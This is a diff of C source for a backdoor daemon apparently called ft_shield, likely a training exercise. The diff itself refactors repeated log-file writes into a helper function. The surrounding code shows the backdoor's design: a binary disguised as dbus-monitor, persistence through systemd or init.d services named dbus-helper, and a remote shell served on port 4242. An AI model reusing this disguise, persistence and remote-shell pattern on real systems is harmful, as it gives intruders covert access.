@@ -23,11 +23,13 @@
 #define DISGUISED_TARGET_PATH "/usr/local/bin/dbus-monitor" 
 #define SERVICE_PATH_SYSTEMD "/etc/systemd/system/dbus-helper.service" 
 #define SERVICE_PATH_SYSVINIT "/etc/init.d/dbus-helper"
+#define LOG_FILE_PATH "/var/log/ft_shield_actions.log"
 #define PORT 4242
 
 sem_t connection_semaphore;
 
 void md5(const uint8_t *initial_msg, size_t initial_len, uint8_t *digest);
+void log_message(const char* filename, const char* message_format, ...);
 
 int use_systemd()
 {
@@ -250,7 +252,6 @@ void handle_client(int client_socket, const char *client_ip)
     char buffer[1024];
     int authenticated = 0;
     int shell = 0;
-    FILE *log = NULL;
     size_t total_data_sent = 0;
     size_t total_data_received = 0;
 
@@ -275,23 +276,11 @@ void handle_client(int client_socket, const char *client_ip)
         }
         else
         {
-            log = fopen("/var/log/ft_shield_actions.log", "a");
-            if (log)
-            {
-                fprintf(log, "Rejected connection from %s due to: Authentication failed.\n", client_ip);
-                fclose(log);
-                log = NULL;
-            }
+            log_message(LOG_FILE_PATH, "Rejected connection from %s due to: Authentication failed.\n", client_ip);
         }
     }
 
-    log = fopen("/var/log/ft_shield_actions.log", "a");
-    if (log)
-    {
-        fprintf(log, "Connection from %s received.\n", client_ip);
-        fclose(log);
-        log = NULL;
-    }
+    log_message(LOG_FILE_PATH, "Connection from %s received.\n", client_ip);
 
     shell = mid_state_promt(client_socket);
 
@@ -336,13 +325,7 @@ void handle_client(int client_socket, const char *client_ip)
 
                     total_data_sent += n;
                     
-                    log = fopen("/var/log/ft_shield_actions.log", "a");
-                    if (log)
-                    {
-                        fprintf(log, "Command output: %.*s\n", n, buffer);
-                        fclose(log);
-                        log = NULL;
-                    }
+                    log_message(LOG_FILE_PATH, "Command output: %.*s", n, buffer);
                 }
 
                 if (FD_ISSET(client_socket, &fds))
@@ -353,26 +336,14 @@ void handle_client(int client_socket, const char *client_ip)
 
                     total_data_received += n;
 
-                    log = fopen("/var/log/ft_shield_actions.log", "a");
-                    if (log)
-                    {
-                        fprintf(log, "Command requested: %.*s", n, buffer);
-                        fclose(log);
-                        log = NULL;
-                    }
-
+                    log_message(LOG_FILE_PATH, "Command requested: %.*s", n, buffer);
                 }
             }
             close(master_fd);
         }
     }
 
-    log = fopen("/var/log/ft_shield_actions.log", "a");
-    if (log)
-    {
-        fprintf(log, "Session from %s ended. Data sent: %zd bytes, Data received: %zd bytes\n", client_ip, total_data_sent, total_data_received);
-        fclose(log);
-    }
+    log_message(LOG_FILE_PATH, "Session from %s ended. Data sent: %zd bytes, Data received: %zd bytes\n", client_ip, total_data_sent, total_data_received);
 
     close(client_socket);
 }
@@ -425,14 +396,8 @@ void daemon_main()
         client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &client_addr_size);
         if (client_socket == -1)
         {
-            FILE *log = NULL;
-            log = fopen("/var/log/ft_shield_actions.log", "a");
-            if (log)
-            {
-                fprintf(log, "Incomming connection refused due to: Accept Failed.\n");
-                fclose(log);
-                log = NULL;
-            }
+            log_message(LOG_FILE_PATH, "Incomming connection refused due to: Accept Failed.\n");
+            
             // perror("Accept failed");
             sem_post(&connection_semaphore);
             continue;
